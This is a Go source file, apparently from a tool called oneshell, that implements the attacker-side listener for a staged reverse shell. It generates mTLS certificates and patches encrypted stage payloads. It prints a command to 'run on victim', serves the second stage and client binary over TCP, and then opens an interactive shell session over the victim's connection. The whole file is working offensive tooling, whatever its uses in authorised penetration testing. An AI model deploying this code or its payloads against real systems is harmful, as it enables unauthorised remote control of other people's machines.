package pkg

import (
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"fmt"
	"io"
	"log"
	"net"
	"os"

	"github.com/tantosec/oneshell/pkg/patching"
)

type Listener struct {
	Listen func(n string, addr string) (net.Listener, error)
	Port   uint16
}

func resolveIP(target string) (net.IP, error) {
	targetIPs, err := net.LookupIP(target)
	if err != nil {
		return nil, err
	}

	for _, currIp := range targetIPs {
		if ipv4 := currIp.To4(); ipv4 != nil {
			return ipv4, nil
		}
	}

	return nil, fmt.Errorf("could not resolve hostname %v to ip", target)
}

func Listen(listener Listener, target string) error {
	targetIP, err := resolveIP(target)
	if err != nil {
		return fmt.Errorf("failed to resolve hostname %v", target)
	}

	fmt.Println("Generating temporary MTLS certificates...")
	serverCert, serverKey, err := generateCertificate(targetIP)
	if err != nil {
		return err
	}
	clientCert, clientKey, err := generateCertificate(nil)
	if err != nil {
		return err
	}

	secretKey := make([]byte, 16)
	_, err = rand.Read(secretKey)
	if err != nil {
		return err
	}

	clientPatched, err := patching.PatchAndEncryptClient(targetIP, listener.Port, serverCert, clientCert, clientKey, secretKey)
	if err != nil {
		return err
	}
	stage2Patched := patching.PatchStage2(targetIP, listener.Port)
	stage1Patched, err := patching.PatchStage1(targetIP, listener.Port, stage2Patched, secretKey)
	if err != nil {
		return err
	}

	fmt.Printf("Payload connects to %v:%v", targetIP, listener.Port)
	fmt.Println()
	fmt.Println("Copy the following command and run on victim:")
	fmt.Println()
	fmt.Println(RunEchoifiedBinary(stage1Patched))
	fmt.Println()

	if err := sendStages(listener, stage2Patched, clientPatched); err != nil {
		return err
	}

	log.Println("Client should have started. Awaiting second connection...")

	return receiveClient(listener, serverCert, serverKey, clientCert)
}

func listenTcp(listener Listener) (net.Listener, error) {
	l, err := listener.Listen("tcp", fmt.Sprintf("0.0.0.0:%v", listener.Port))
	if err != nil {
		return nil, fmt.Errorf("listen: failed to listen on port %v: %v", listener.Port, err)
	}

	log.Printf("Listening for connections on 0.0.0.0:%v\n", listener.Port)

	return l, nil
}

func acceptTcp(listener Listener) (net.Conn, error) {
	l, err := listenTcp(listener)
	if err != nil {
		return nil, err
	}
	defer l.Close()

	conn, err := l.Accept()
	if err != nil {
		return nil, fmt.Errorf("listen: failed to receive connection: %v", err)
	}

	log.Printf("Connection accepted from %v\n", conn.RemoteAddr())

	return conn, nil
}

func acceptTls(listener Listener, serverCert []byte, serverKey []byte, clientCert []byte) (net.Conn, error) {
	cert, err := tls.X509KeyPair(serverCert, serverKey)
	if err != nil {
		return nil, fmt.Errorf("failed to load server key pair: %v", err)
	}

	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(clientCert)

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		ClientAuth:   tls.RequireAndVerifyClientCert,
		ClientCAs:    caCertPool,
	}

	tcpListener, err := listenTcp(listener)
	if err != nil {
		return nil, fmt.Errorf("listen: failed to listen on port %v: %v", listener.Port, err)
	}
	l := tls.NewListener(tcpListener, tlsConfig)
	defer l.Close()

	conn, err := l.Accept()
	if err != nil {
		return nil, fmt.Errorf("listen: failed to receive connection: %v", err)
	}

	log.Printf("Connection accepted from %v\n", conn.RemoteAddr())

	return conn, nil
}

func sendStages(listener Listener, stage2Patched []byte, clientPatched []byte) error {
	if err := stage1To2(listener, stage2Patched); err != nil {
		return err
	}
	return stage2ToClient(listener, clientPatched)
}

func stage1To2(listener Listener, stage2Data []byte) error {
	conn, err := acceptTcp(listener)
	if err != nil {
		return err
	}
	defer conn.Close()

	log.Println("Sending stage 2 data...")
	_, err = conn.Write(stage2Data)

	return err
}

func stage2ToClient(listener Listener, clientData []byte) error {
	conn, err := acceptTcp(listener)
	if err != nil {
		return err
	}
	defer conn.Close()

	log.Println("Sending client data...")

	_, err = conn.Write(clientData)
	return err
}

func receiveClient(listener Listener, serverCert []byte, serverKey []byte, clientCert []byte) error {
	conn, err := acceptTls(listener, serverCert, serverKey, clientCert)
	if err != nil {
		return err
	}

	fmt.Println()
	fmt.Println("=== BEGIN SHELL SESSION ===")
	fmt.Println()

	go io.Copy(conn, os.Stdout)

	_, err = io.Copy(os.Stdin, conn)

	return err
}
